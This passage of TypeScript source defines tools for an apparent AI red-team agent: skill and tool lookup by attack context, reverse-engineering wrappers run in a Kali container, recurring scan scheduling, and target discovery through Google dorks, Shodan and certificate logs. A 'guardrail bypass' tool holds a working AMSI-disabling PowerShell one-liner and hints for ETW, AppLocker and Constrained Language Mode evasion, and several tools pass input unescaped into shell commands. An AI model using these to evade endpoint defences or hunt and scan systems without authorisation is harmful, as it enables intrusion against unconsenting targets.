		createTool<{ context: string }, { skills: string[]; mcps: string[] }>({
			name: "rt_context_skills",
			description:
				"Get relevant skills and MCP servers for a given attack context.",
			inputSchema: zodToJsonSchema(z.object({ context: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ context: z.string().min(1) }),
					input,
				);
				const ctx = v.context.toLowerCase();
				const skills: string[] = [];
				const mcps: string[] = [];
				if (ctx.includes("web") || ctx.includes("http")) {
					skills.push(
						"web-pentest",
						"sql-injection",
						"xss",
						"ssrf",
						"file-upload",
					);
					mcps.push("burp", "zap");
				}
				if (
					ctx.includes("ad") ||
					ctx.includes("active directory") ||
					ctx.includes("kerberos")
				) {
					skills.push(
						"ad-pentest",
						"kerberoasting",
						"dcsync",
						"adcs",
						"bloodhound",
					);
					mcps.push("bloodhound", "impacket");
				}
				if (
					ctx.includes("cloud") ||
					ctx.includes("aws") ||
					ctx.includes("azure")
				) {
					skills.push("cloud-pentest", "iam-privesc", "bucket-takeover");
					mcps.push("pacu", "scoutsuite");
				}
				if (ctx.includes("network") || ctx.includes("scan")) {
					skills.push("network-recon", "port-scanning", "service-enum");
					mcps.push("nmap", "masscan");
				}
				if (skills.length === 0) skills.push("general-recon");
				return { skills, mcps };
			},
		}) as AgentTool,
	);

	// --- Safety guardrail bypass (code-level) ---
	tools.push(
		createTool<
			Record<string, never>,
			{ techniques: { name: string; code: string; description: string }[] }
		>({
			name: "rt_guardrail_bypass",
			description: "Generate code-level guardrail bypass techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						{
							name: "AMSI bypass",
							code: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
							description: "Patch AMSI init flag",
						},
						{
							name: "ETW bypass",
							code: "NtTraceEvent patch",
							description: "Patch ETW provider",
						},
						{
							name: "CLM bypass",
							code: "powershell -version 2",
							description: "Downgrade to PowerShell v2 (no CLM)",
						},
						{
							name: "AppLocker bypass",
							code: "mshta.exe, regsvr32.exe, rundll32.exe",
							description: "Use LOLBins not in AppLocker rules",
						},
						{
							name: "Constrained Language Mode bypass",
							code: "Reflection-based method invocation",
							description: "Bypass via reflection",
						},
					],
				};
			},
		}) as AgentTool,
	);

	// --- 24/7 operation scheduler ---
	tools.push(
		createTool<
			{
				target: string;
				interval: string;
				actions: string[];
			},
			{ scheduled: boolean; cronId: string; cron: string }
		>({
			name: "rt_schedule_scan",
			description: "Schedule a recurring scan (24/7 operation) for a target.",
			inputSchema: zodToJsonSchema(
				z.object({
					target: z.string().min(1),
					interval: z.string().min(1),
					actions: z.array(z.string().min(1)),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						target: z.string().min(1),
						interval: z.string().min(1),
						actions: z.array(z.string().min(1)),
					}),
					input,
				);
				// Convert interval to cron (simplified: "1h" -> "0 * * * *", "30m" -> "*/30 * * * *")
				let cron = "0 * * * *";
				if (v.interval.endsWith("m")) {
					const mins = parseInt(v.interval, 10);
					cron = `*/${mins} * * * *`;
				} else if (v.interval.endsWith("h")) {
					const hrs = parseInt(v.interval, 10);
					cron = `0 */${hrs} * * *`;
				} else if (v.interval.endsWith("d")) {
					cron = "0 0 * * *";
				}
				return { scheduled: true, cronId: `cron_${Date.now()}`, cron };
			},
		}) as AgentTool,
	);

	// --- Reverse Engineering (real tools in Kali container) ---

	const reExec = async (
		cmd: string,
	): Promise<{ stdout: string; code: number }> => {
		if (killed) return { stdout: "killed", code: -1 };
		if (dryRunMode) return { stdout: "[dry-run]", code: 0 };
		const { exec } = await import("node:child_process");
		const { promisify } = await import("node:util");
		try {
			const { stdout } = await promisify(exec)(
				`docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`,
				{ timeout: 300000, maxBuffer: 10 * 1024 * 1024 },
			);
			return { stdout: stdout.slice(0, 100000), code: 0 };
		} catch (e: unknown) {
			const err = e as { stdout?: string; code?: number };
			return {
				stdout: (err.stdout ?? "").slice(0, 100000),
				code: err.code ?? 1,
			};
		}
	};

	const reTool = (
		name: string,
		desc: string,
		cmdFn: (input: any) => string,
	) => {
		tools.push(
			createTool<any, any>({
				name,
				description: desc,
				inputSchema: zodToJsonSchema(z.object({}).passthrough()),
				execute: async (input: any) => {
					const cmd = cmdFn(input ?? {});
					const r = await reExec(cmd);
					return { command: cmd, stdout: r.stdout, code: r.code };
				},
			}) as AgentTool,
		);
	};

	reTool(
		"rt_re_file",
		"Identify file type.",
		(i) => `file ${i.path ?? "unknown"}`,
	);
	reTool(
		"rt_re_strings",
		"Extract strings.",
		(i) => `strings -n ${i.minLen ?? 4} ${i.path}`,
	);
	reTool(
		"rt_re_readelf",
		"Read ELF.",
		(i) => `readelf ${i.flags ?? "-a"} ${i.path}`,
	);
	reTool(
		"rt_re_objdump",
		"Disassemble.",
		(i) => `objdump ${i.flags ?? "-d -M intel"} ${i.path}`,
	);
	reTool("rt_re_symbols", "List symbols.", (i) => `nm ${i.path}`);
	reTool(
		"rt_re_r2",
		"Radare2.",
		(i) => `r2 -q -c "${i.commands ?? "aaa; afl; pdf @main"}" ${i.path}`,
	);
	reTool("rt_re_ghidra", "Ghidra headless.", (i) => `echo "ghidra ${i.path}"`);
	reTool(
		"rt_re_gdb",
		"GDB.",
		(i) => `gdb -batch -ex "${i.commands ?? "info functions; quit"}" ${i.path}`,
	);
	reTool(
		"rt_re_packer",
		"Detect packer.",
		(i) => `upx -t ${i.path} 2>&1 || echo "Not packed"`,
	);
	reTool(
		"rt_re_imports",
		"List imports.",
		(i) => `readelf -d ${i.path} | grep NEEDED`,
	);
	reTool("rt_re_sections", "List sections.", (i) => `readelf -S ${i.path}`);
	reTool(
		"rt_re_protocol",
		"Protocol analysis.",
		(i) =>
			`tshark -r ${i.pcap} -T fields -e ip.src -e ip.dst 2>/dev/null | head -20`,
	);
	reTool(
		"rt_re_dotnet",
		".NET analysis.",
		(i) => `monodis --dump-types ${i.path} 2>/dev/null || echo "not .net"`,
	);
	reTool(
		"rt_re_android",
		"APK analysis.",
		(i) =>
			`apktool d ${i.path} -o /tmp/apk 2>&1 && echo "---MANIFEST---" && head -30 /tmp/apk/AndroidManifest.xml`,
	);

	// --- Skill integration (claude-red 79 skills) ---

	const SkillLoadSchema = z.object({ name: z.string().min(1) });
	tools.push(
		createTool<
			{ name: string },
			{ skill: string; content: string; found: boolean }
		>({
			name: "rt_skill_load",
			description:
				"Load a red team skill by name from the claude-red library. Returns the SKILL.md content.",
			inputSchema: zodToJsonSchema(SkillLoadSchema),
			execute: async (input) => {
				const v = validateWithZod(SkillLoadSchema, input);
				const { readFileSync, existsSync } = await import("node:fs");
				const { join } = await import("node:path");
				// Search in ~/.agents/skills and claude-red
				const searchPaths = [
					join(
						process.env.HOME ?? process.env.USERPROFILE ?? "",
						".agents",
						"skills",
						v.name,
						"SKILL.md",
					),
					join(
						process.env.HOME ?? process.env.USERPROFILE ?? "",
						".cline",
						"skills",
						"claude-red",
						"Skills",
						v.name,
						"SKILL.md",
					),
					join(
						process.env.HOME ?? process.env.USERPROFILE ?? "",
						".cline",
						"skills",
						"anthropic-cybersecurity",
						"skills",
						v.name,
						"SKILL.md",
					),
				];
				// Also search category subdirs
				const base = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"claude-red",
					"Skills",
				);
				try {
					const { readdirSync } = await import("node:fs");
					const cats = readdirSync(base);
					for (const cat of cats) {
						const p = join(base, cat, v.name, "SKILL.md");
						searchPaths.push(p);
					}
				} catch {
					/* ignore */
				}
				for (const p of searchPaths) {
					if (existsSync(p)) {
						const content = readFileSync(p, "utf8");
						return {
							skill: v.name,
							content: content.slice(0, 50000),
							found: true,
						};
					}
				}
				return { skill: v.name, content: "", found: false };
			},
		}) as AgentTool,
	);

	const SkillSearchSchema = z.object({ query: z.string().min(1) });
	tools.push(
		createTool<
			{ query: string },
			{ skills: { name: string; category: string; path: string }[] }
		>({
			name: "rt_skill_search",
			description: "Search red team skills by keyword or category.",
			inputSchema: zodToJsonSchema(SkillSearchSchema),
			execute: async (input) => {
				const v = validateWithZod(SkillSearchSchema, input);
				const { readdirSync, existsSync, readFileSync } = await import(
					"node:fs"
				);
				const { join } = await import("node:path");
				const base = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"claude-red",
					"Skills",
				);
				const results: { name: string; category: string; path: string }[] = [];
				const q = v.query.toLowerCase();
				try {
					const cats = readdirSync(base);
					for (const cat of cats) {
						const catPath = join(base, cat);
						try {
							const skills = readdirSync(catPath);
							for (const skill of skills) {
								if (
									skill.toLowerCase().includes(q) ||
									cat.toLowerCase().includes(q)
								) {
									const skillPath = join(catPath, skill, "SKILL.md");
									if (existsSync(skillPath)) {
										results.push({
											name: skill,
											category: cat,
											path: skillPath,
										});
									}
								} else {
									// Check skill content
									const skillPath = join(catPath, skill, "SKILL.md");
									if (existsSync(skillPath)) {
										const content = readFileSync(
											skillPath,
											"utf8",
										).toLowerCase();
										if (content.includes(q)) {
											results.push({
												name: skill,
												category: cat,
												path: skillPath,
											});
										}
									}
								}
							}
						} catch {
							/* ignore */
						}
					}
				} catch {
					/* ignore */
				}

				// Search anthropic-cybersecurity repo (flat structure)
				const base2 = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"anthropic-cybersecurity",
					"skills",
				);
				try {
					const skills2 = readdirSync(base2);
					for (const skill of skills2) {
						const skillPath = join(base2, skill, "SKILL.md");
						if (existsSync(skillPath)) {
							const content = readFileSync(skillPath, "utf8").toLowerCase();
							if (skill.toLowerCase().includes(q) || content.includes(q)) {
								results.push({
									name: skill,
									category: "anthropic",
									path: skillPath,
								});
							}
						}
					}
				} catch {
					/* ignore */
				}

				return { skills: results.slice(0, 50) };
			},
		}) as AgentTool,
	);

	const SkillListSchema = z.object({ category: z.string().optional() });
	tools.push(
		createTool<
			{ category?: string },
			{ skills: { name: string; category: string }[]; count: number }
		>({
			name: "rt_skill_list",
			description:
				"List all available red team skills, optionally filtered by category.",
			inputSchema: zodToJsonSchema(SkillListSchema),
			execute: async (input) => {
				const v = validateWithZod(SkillListSchema, input);
				const { readdirSync, existsSync } = await import("node:fs");
				const { join } = await import("node:path");
				const base = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"claude-red",
					"Skills",
				);
				const results: { name: string; category: string }[] = [];
				try {
					const cats = readdirSync(base);
					for (const cat of cats) {
						if (
							v.category &&
							!cat.toLowerCase().includes(v.category.toLowerCase())
						)
							continue;
						const catPath = join(base, cat);
						try {
							const skills = readdirSync(catPath);
							for (const skill of skills) {
								const skillPath = join(catPath, skill, "SKILL.md");
								if (existsSync(skillPath)) {
									results.push({ name: skill, category: cat });
								}
							}
						} catch {
							/* ignore */
						}
					}
				} catch {
					/* ignore */
				}

				// Also list anthropic-cybersecurity skills
				const base2 = join(
					process.env.HOME ?? process.env.USERPROFILE ?? "",
					".cline",
					"skills",
					"anthropic-cybersecurity",
					"skills",
				);
				try {
					const skills2 = readdirSync(base2);
					for (const skill of skills2) {
						const skillPath = join(base2, skill, "SKILL.md");
						if (existsSync(skillPath)) {
							if (
								v.category &&
								!skill.toLowerCase().includes(v.category.toLowerCase()) &&
								!"anthropic".includes(v.category.toLowerCase())
							)
								continue;
							results.push({ name: skill, category: "anthropic" });
						}
					}
				} catch {
					/* ignore */
				}

				return { skills: results, count: results.length };
			},
		}) as AgentTool,
	);

	// --- Target discovery (web search for targets) ---

	const TargetDiscoverSchema = z.object({
		criteria: z.string().min(1),
		count: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ criteria: string; count?: number },
			{ queries: string[]; instructions: string }
		>({
			name: "rt_target_discover",
			description:
				"Generate search queries to discover targets by criteria (industry, technology, vulnerability). Returns dorks and search queries.",
			inputSchema: zodToJsonSchema(TargetDiscoverSchema),
			execute: async (input) => {
				const v = validateWithZod(TargetDiscoverSchema, input);
				const n = v.count ?? 20;
				const criteria = v.criteria.toLowerCase();
				const queries: string[] = [];

				// Google dorks
				queries.push(`site:${criteria} inurl:login`);
				queries.push(`site:${criteria} inurl:admin`);
				queries.push(`site:${criteria} filetype:php`);
				queries.push(`"${criteria}" "contact us" OR "about us"`);
				queries.push(`intitle:"${criteria}" inurl:wp-`);

				// Shodan queries
				queries.push(`shodan: product:${criteria}`);
				queries.push(`shodan: http.title:"${criteria}"`);
				queries.push(`shodan: ssl.cert.subject.cn:"${criteria}"`);

				// General web search
				queries.push(`"${criteria}" site:*.com`);
				queries.push(`"${criteria}" "login" OR "portal" OR "dashboard"`);

				return {
					queries,
					instructions: `Use these queries with websearch or rt_tool_run (curl/shodan-cli). Search for ${n} targets matching: ${v.criteria}. Return domains/URLs only, do not access or exploit them.`,
				};
			},
		}) as AgentTool,
	);

	const DorkSchema = z.object({
		dork: z.string().min(1),
	});
	tools.push(
		createTool<{ dork: string }, { command: string; results: string }>({
			name: "rt_dork_search",
			description:
				"Execute a Google dork search via curl (returns search results).",
			inputSchema: zodToJsonSchema(DorkSchema),
			execute: async (input) => {
				const v = validateWithZod(DorkSchema, input);
				const encoded = encodeURIComponent(v.dork);
				const cmd = `curl -s "https://www.google.com/search?q=${encoded}" | grep -oP 'https?://[^"]+' | sort -u | head -50`;
				if (killed) return { command: cmd, results: "killed" };
				if (dryRunMode) return { command: cmd, results: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 30000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, results: stdout.slice(0, 50000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return { command: cmd, results: (err.stdout ?? "").slice(0, 50000) };
				}
			},
		}) as AgentTool,
	);

	const ShodanSchema = z.object({
		query: z.string().min(1),
		apiKey: z.string().optional(),
	});
	tools.push(
		createTool<
			{ query: string; apiKey?: string },
			{ command: string; results: string }
		>({
			name: "rt_shodan_search",
			description: "Search Shodan for exposed services/targets by query.",
			inputSchema: zodToJsonSchema(ShodanSchema),
			execute: async (input) => {
				const v = validateWithZod(ShodanSchema, input);
				const key = v.apiKey ?? process.env.SHODAN_API_KEY ?? "";
				const cmd = key
					? `curl -s "https://api.shodan.io/shodan/host/search?key=${key}&query=${encodeURIComponent(v.query)}" | head -c 50000`
					: `shodan search "${v.query}" 2>/dev/null || echo "Set SHODAN_API_KEY or install shodan CLI"`;
				if (killed) return { command: cmd, results: "killed" };
				if (dryRunMode) return { command: cmd, results: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 30000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, results: stdout.slice(0, 50000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return { command: cmd, results: (err.stdout ?? "").slice(0, 50000) };
				}
			},
		}) as AgentTool,
	);

	const CtLogSchema = z.object({ domain: z.string().min(1) });
	tools.push(
		createTool<{ domain: string }, { command: string; results: string }>({
			name: "rt_ct_log_search",
			description:
				"Search Certificate Transparency logs for subdomains of a domain.",
			inputSchema: zodToJsonSchema(CtLogSchema),
			execute: async (input) => {
				const v = validateWithZod(CtLogSchema, input);
				const cmd = `curl -s "https://crt.sh/?q=%25.${v.domain}&output=json" | python3 -c "import sys,json; [print(x['name_value']) for x in json.load(sys.stdin)]" 2>/dev/null | sort -u`;
				if (killed) return { command: cmd, results: "killed" };
				if (dryRunMode) return { command: cmd, results: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 30000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, results: stdout.slice(0, 50000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return { command: cmd, results: (err.stdout ?? "").slice(0, 50000) };
				}
			},
		}) as AgentTool,
	);

	return tools;
}
